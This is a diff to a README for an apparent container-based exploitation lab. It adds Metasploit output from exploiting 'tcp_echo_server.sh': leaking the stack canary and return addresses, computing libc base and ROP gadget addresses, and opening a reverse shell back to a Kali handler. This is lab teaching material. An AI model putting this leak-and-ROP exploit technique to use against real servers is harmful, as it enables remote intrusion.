@@ -75,3 +75,43 @@ LPORT => 5555
 ```
 
 At this point, you should have a reverse shell in the kali-metasploit window into the c-exploit container.
+
+### tcp_echo_server.sh
+Similar to c-exploit above, running "tcp_echo_server.sh" will result in output something like this:
+[*] Started reverse TCP handler on 172.17.0.3:5555 
+[*] 172.16.1.31:8080 - Start...
+[*] 172.16.1.31:8080 - 
+[*] 172.16.1.31:8080 - VULN STACK FRAME...
+[*] 172.16.1.31:8080 - vuln_padding:     ["0000000000000000"] (0x0)
+[*] 172.16.1.31:8080 - vuln_canary:      ["00cf1c4b8c5b8b3c"] (0x3c8b5b8c4b1ccf00)
+[*] 172.16.1.31:8080 - vuln_saved_bp:    ["d0f280fbfd7f0000"] (0x7ffdfb80f2d0)
+[*] 172.16.1.31:8080 - vuln_ret_addr:    ["8a0a400000000000"] (0x400a8a)
+[*] 172.16.1.31:8080 - 
+[*] 172.16.1.31:8080 - MAIN STACK FRAME...
+[*] 172.16.1.31:8080 - main_argv_save:   ["b8f380fbfd7f0000"] (0x7ffdfb80f3b8)
+[*] 172.16.1.31:8080 - main_padding:     ["00000000"]
+[*] 172.16.1.31:8080 - main_argc_save:   ["01000000"] (0x1)
+[*] 172.16.1.31:8080 - main_cli_len:     ["10000000"] (0x10)
+[*] 172.16.1.31:8080 - main_server_port: ["34120000"] (0x1234)
+[*] 172.16.1.31:8080 - main_server_fd:   ["03000000"] (0x3)
+[*] 172.16.1.31:8080 - main_client_fd:   ["04000000"] (0x4)
+[*] 172.16.1.31:8080 - main_server_addr: ["02001f90000000000000000000000000"]
+[*] 172.16.1.31:8080 - main_client_addr: ["02009322ac1100010000000000000000"]
+[*] 172.16.1.31:8080 - main_unknown:     ["b0f380fbfd7f0000"] (0x7ffdfb80f3b0)
+[*] 172.16.1.31:8080 - main_canary:      ["00cf1c4b8c5b8b3c"] (0x3c8b5b8c4b1ccf00)
+[*] 172.16.1.31:8080 - main_saved_bp:    ["0000000000000000"] (0x0)
+[*] 172.16.1.31:8080 - main_ret_addr:    ["454ff962647f0000"] (0x7f6462f94f45)
+[*] 172.16.1.31:8080 - 
+[*] 172.16.1.31:8080 - COMPUTED ADDRESSES...
+[*] 172.16.1.31:8080 - a_libc_base:      0x7f6462f73000
+[*] 172.16.1.31:8080 - a_stack_free:     0x7ffdfb7ff000
+[*] 172.16.1.31:8080 - a_libc_mprotect:  0x7f646306b550
+[*] 172.16.1.31:8080 - a_libc_read:      0x7f6463062320
+[*] 172.16.1.31:8080 - a_libc_poprdi:    0x7f6463063800
+[*] 172.16.1.31:8080 - a_libc_poprsi:    0x7f646305a80b
+[*] 172.16.1.31:8080 - a_libc_poprdx:    0x7f6463033d40
+[*] 172.16.1.31:8080 - 
+[*] 172.16.1.31:8080 - Done. (If successful, you should get a promptless shell.)
+[*] Command shell session 1 opened (172.17.0.3:5555 -> 172.17.0.2:53730) at 2017-09-15 20:38:14 +0000
+
+
